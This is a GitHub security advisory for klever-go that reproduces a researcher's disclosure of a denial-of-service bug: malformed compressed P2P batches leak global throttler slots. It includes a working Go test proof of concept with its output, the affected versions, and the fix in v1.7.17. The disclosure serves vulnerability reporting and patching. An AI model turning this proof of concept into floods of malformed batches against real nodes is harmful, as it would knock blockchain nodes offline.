# [H] Klever-Go P2P MultiDataInterceptor leaks global throttler slots on malformed compressed batches (DoS)

## Summary
Severity: High
Advisory: GHSA-74m6-4hjp-7226
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-74m6-4hjp-7226
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0 <1.7.17

## Details
## Publisher note

**Fixed in `v1.7.17`.** Operators running `< v1.7.17` should upgrade. The decompression-error path in `MultiDataInterceptor.ProcessReceivedMessage` now releases the global throttler slot before returning (guarded `defer` after `StartProcessing()`, disabled when the asynchronous goroutine takes ownership).

Patch commits on `develop`: 333f6ec9, 68b94a40 (merged from private fork `klever-io/klever-go-ghsa-74m6-4hjp-7226`).

This advisory was originally filed jointly with a separate KVM read-only isolation bypass; that finding is now tracked under [GHSA-jc6w-wmfc-fh33](https://github.com/klever-io/klever-go/security/advisories/GHSA-jc6w-wmfc-fh33) so each issue receives its own CVE.

The original disclosure from @LoGGGG240211 follows verbatim, including the embedded proof-of-concept source.

---

# Private Vulnerability Report

Repository: klever-io/klever-go
Reviewed commit: 405d01b0abbf0d3e73b4a990bd7394a01f200dc2
Disclosure channel: GitHub Private Vulnerability Reporting
Reporter GitHub account: LoGGGG240211

## 2.1 MultiDataInterceptor malformed compressed batches permanently consume global P2P throttler slots

Severity            : High
Confidence          : HIGH
Attack Complexity   : LOW
PoC Status          : Confirmed

### Description

The P2P `MultiDataInterceptor` starts throttled processing before it validates and decompresses a received batch. `PreProcessMessage` checks whether the global interceptor throttler can process the message and then calls `StartProcessing()`. After that point, `ProcessReceivedMessage` unmarshals the batch and enters the compressed-batch branch when `b.IsCompressed` is true. If `b.Decompress()` fails, the function logs the gzip error and returns immediately without calling `EndProcessing()`.

This creates a permanent slot leak in the interceptor throttler. The normal successful path releases the slot only later in the asynchronous processing goroutine. Other validation error paths release the slot explicitly, but the decompression-error path does not. The impact is amplified because the same global throttler is shared by transaction multi-data interceptors, trie-node multi-data interceptors, and header interceptors. The hardcoded global capacity is 100, so a connected peer that can deliver 100 malformed compressed batch envelopes can cause later valid P2P interceptor processing on the affected node to fail with `system busy` until the process is restarted or the throttler state is otherwise reset.

### Location

1. [baseDataInterceptor.go, PreProcessMessage(), line 42](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/interceptors/baseDataInterceptor.go#L42)
2. [baseDataInterceptor.go, PreProcessMessage(), line 47](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/interceptors/baseDataInterceptor.go#L47)
3. [multiDataInterceptor.go, ProcessReceivedMessage(), line 95](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/interceptors/multiDataInterceptor.go#L95)
4. [multiDataInterceptor.go, ProcessReceivedMessage(), line 99](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/interceptors/multiDataInterceptor.go#L99)
5. [baseInterceptorsContainerFactory.go, numGoRoutines, line 21](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go#L21)
6. [baseInterceptorsContainerFactory.go, createOneTxInterceptor(), line 160](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go#L160)
7. [baseInterceptorsContainerFactory.go, createOneTrieNodesInterceptor(), line 190](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go#L190)
8. [baseInterceptorsContainerFactory.go, generateMetachainHeaderInterceptors(), line 232](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go#L232)

### Preconditions

1. The attacker can connect as a P2P peer or otherwise send P2P messages that reach a `MultiDataInterceptor` topic handler.
2. The malformed message must pass the outer preprocessing checks before the decompression branch.
3. No validator role, private key, capital, oracle condition, or timing condition is required.

### Impact

Successful exploitation causes a persistent per-node denial of P2P interceptor processing until node restart or throttler reset. The affected throttler is shared across transaction batch processing and trie-node sync processing, and header processing also uses the same throttler. The PoC demonstrates the concrete effect with a capacity-2 throttler: two malformed compressed batches leak both slots and the third message returns `system busy`. In the reviewed codebase, the production factory hardcodes the shared capacity to 100, so the same condition is expected after approximately 100 malformed compressed batches. The impact is reversible by restarting the node or otherwise resetting the throttler state.

### Exploit Cost

No gas and no protocol capital are required. The practical cost is the network cost of sending malformed compressed P2P batch messages to the target node, approximately 100 messages for the hardcoded production global capacity.

### Steps to Reproduce

1. Place `poc_mdi_throttler_slot_leak_test.go` in an empty directory.
2. Run the dependency commands listed in the PoC header.
3. Run `GOTOOLCHAIN=go1.25.9 go test -v poc_mdi_throttler_slot_leak_test.go`.
4. Observe that the first proof increments `StartProcessing()` without incrementing `EndProcessing()` after a gzip decompression error.
5. Observe that the second proof uses a real capacity-2 throttler and reaches `system busy` on the third malformed compressed batch.

### Proof-of-Concept Result

Running `GOTOOLCHAIN=go1.25.9 go test -v poc_mdi_throttler_slot_leak_test.go` after dependency setup produces the following output. The result confirms that malformed compressed batches leak throttler slots and cause a real throttler to reject later processing as `system busy`.

```text
=== RUN   TestPoC_MalformedCompressedBatchLeaksThrottlerSlot
ERROR[2026-04-28 13:35:04.398]   MultiDataInterceptor.ProcessReceivedMessage err = gzip: invalid header
    poc_mdi_throttler_slot_leak_test.go:108: process_error=gzip: invalid header
    poc_mdi_throttler_slot_leak_test.go:109: start_count_before=0
    poc_mdi_throttler_slot_leak_test.go:110: start_count_after=1
    poc_mdi_throttler_slot_leak_test.go:111: end_count_before=0
    poc_mdi_throttler_slot_leak_test.go:112: end_count_after=0
ERROR[2026-04-28 13:35:04.398]   MultiDataInterceptor.ProcessReceivedMessage err = gzip: invalid header
ERROR[2026-04-28 13:35:04.398]   MultiDataInterceptor.ProcessReceivedMessage err = gzip: invalid header
    poc_mdi_throttler_slot_leak_test.go:133: real_throttler_attempt_1=gzip: invalid header
    poc_mdi_throttler_slot_leak_test.go:134: real_throttler_attempt_2=gzip: invalid header
    poc_mdi_throttler_slot_leak_test.go:135: real_throttler_attempt_3=system busy
--- PASS: TestPoC_MalformedCompressedBatchLeaksThrottlerSlot (0.00s)
PASS
ok  	command-line-arguments	0.002s
```

### Suggested Fix

Ensure that every path after `StartProcessing()` releases the throttler slot exactly once. A direct fix is to call `EndProcessing()` before returning from the decompression-error branch. A more robust fix is to use a guarded `defer` immediately after `StartProcessing()` and disable that defer only when the asynchronous goroutine takes ownership of releasing the slot.

## Closing

I am available to answer technical questions regarding these findings and to review proposed fixes prior to deployment. Please contact me through this disclosure thread or through the email address associated with this submission.

## Proof-of-Concept Source

### poc_mdi_throttler_slot_leak_test.go

```go
package poc

/*
Target contract   : Klever-Go P2P MultiDataInterceptor; no on-chain address
Vulnerability     : Denial of service through leaked global P2P throttler slots
Severity          : High
How to run        : GOTOOLCHAIN=go1.25.9 go test -v poc_mdi_throttler_slot_leak_test.go
Expected output   : The test passes and logs that a real throttler returns system busy after malformed compressed batches
Dependencies      : In an empty directory containing this file, run: go mod init klever-go-disclosure-poc; go get github.com/klever-io/klever-go@v1.7.17-0.20260422114731-405d01b0abbf; go mod tidy
*/

import (
	"errors"
	"fmt"
	"testing"

	"github.com/klever-io/klever-go/common"
	"github.com/klever-io/klever-go/common/mock"
	"github.com/klever-io/klever-go/core"
	"github.com/klever-io/klever-go/core/process/interceptors"
	"github.com/klever-io/klever-go/core/throttler"
	"github.com/klever-io/klever-go/data/batch"
)

func malformedCompressedBatchPayload(t *testing.T, marshalizer *mock.MarshalizerMock) []byte {
	t.Helper()

	// Build a syntactically valid batch envelope whose compressed stream is not valid gzip.
	payload, err := marshalizer.Marshal(&batch.Batch{
		IsCompressed: true,
		Stream:       []byte("not-a-gzip-stream"),
		DataSize:     1,
	})
	if err != nil {
		t.Fatalf("marshal malformed compressed batch: %v", err)
	}

	return payload
}

func newMultiDataInterceptor(t *testing.T, marshalizer *mock.MarshalizerMock, throttlerArg interface {
	CanProcess() bool
	StartProcessing()
	EndProcessing()
	IsInterfaceNil() bool
}) *interceptors.MultiDataInterceptor {
	t.Helper()

	// Use the production transaction topic and production MultiDataInterceptor constructor.
	arg := interceptors.ArgMultiDataInterceptor{
		Topic:            common.TransactionTopic,
		Marshalizer:      marshalizer,
		DataFactory:      &mock.InterceptedDataFactoryStub{},
		Processor:        &mock.InterceptorProcessorStub{},
		Throttler:        throttlerArg,
		AntifloodHandler: &mock.P2PAntifloodHandlerStub{},
		WhiteListRequest: &mock.WhiteListHandlerStub{},
		CurrentPeerID:    core.PeerID("local-peer"),
	}

	mdi, err := interceptors.NewMultiDataInterceptor(arg)
	if err != nil {
		t.Fatalf("construct MultiDataInterceptor: %v", err)
	}

	return mdi
}

func malformedP2PBatchMessage(payload []byte, sequence int) *mock.P2PMessageMock {
	// Build a P2P message that passes outer message preprocessing and reaches decompression.
	return &mock.P2PMessageMock{
		DataField:  payload,
		PeerField:  core.PeerID("origin-peer"),
		SeqNoField: []byte(fmt.Sprintf("seq-%d", sequence)),
	}
}

func TestPoC_MalformedCompressedBatchLeaksThrottlerSlot(t *testing.T) {
	marshalizer := &mock.MarshalizerMock{}

	// First prove that a malformed compressed batch calls StartProcessing without a matching EndProcessing.
	countingThrottler := &mock.InterceptorThrottlerStub{
		CanProcessCalled: func() bool { return true },
	}
	mdiWithCountingThrottler := newMultiDataInterceptor(t, marshalizer, countingThrottler)
	payload := malformedCompressedBatchPayload(t, marshalizer)
	message := malformedP2PBatchMessage(payload, 1)

	startBefore := countingThrottler.StartProcessingCount()
	endBefore := countingThrottler.EndProcessingCount()

	err := mdiWithCountingThrottler.ProcessReceivedMessage(message, core.PeerID("connected-peer"))

	startAfter := countingThrottler.StartProcessingCount()
	endAfter := countingThrottler.EndProcessingCount()

	// The vulnerable branch returns the gzip error after StartProcessing but before EndProcessing.
	if err == nil {
		t.Fatalf("expected gzip error, got nil")
	}
	if startAfter != startBefore+1 {
		t.Fatalf("expected one throttler start, before=%d after=%d", startBefore, startAfter)
	}
	if endAfter != endBefore {
		t.Fatalf("expected no throttler end on decompress error, before=%d after=%d", endBefore, endAfter)
	}

	t.Logf("process_error=%v", err)
	t.Logf("start_count_before=%d", startBefore)
	t.Logf("start_count_after=%d", startAfter)
	t.Logf("end_count_before=%d", endBefore)
	t.Logf("end_count_after=%d", endAfter)

	// Then prove direct impact with a real capacity-2 throttler.
	realThrottler, err := throttler.NewNumGoRoutinesThrottler(2)
	if err != nil {
		t.Fatalf("construct real throttler: %v", err)
	}
	mdiWithRealThrottler := newMultiDataInterceptor(t, marshalizer, realThrottler)

	err1 := mdiWithRealThrottler.ProcessReceivedMessage(malformedP2PBatchMessage(payload, 2), core.PeerID("connected-peer"))
	err2 := mdiWithRealThrottler.ProcessReceivedMessage(malformedP2PBatchMessage(payload, 3), core.PeerID("connected-peer"))
	err3 := mdiWithRealThrottler.ProcessReceivedMessage(malformedP2PBatchMessage(payload, 4), core.PeerID("connected-peer"))

	// The third attempt is rejected as system busy because leaked slots were not released.
	if err1 == nil || err2 == nil {
		t.Fatalf("expected first two malformed attempts to return gzip errors, got err1=%v err2=%v", err1, err2)
	}
	if !errors.Is(err3, common.ErrSystemBusy) {
		t.Fatalf("expected third attempt to hit system busy, got %v", err3)
	}

	t.Logf("real_throttler_attempt_1=%v", err1)
	t.Logf("real_throttler_attempt_2=%v", err2)
	t.Logf("real_throttler_attempt_3=%v", err3)
}
```

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-74m6-4hjp-7226
- https://github.com/klever-io/klever-go/commit/333f6ec910906e227705fc5767dc897d8fbfc862
- https://github.com/klever-io/klever-go/commit/68b94a40824fac2d848a4ded6eb7c91ada6ce9ef
- https://github.com/klever-io/klever-go
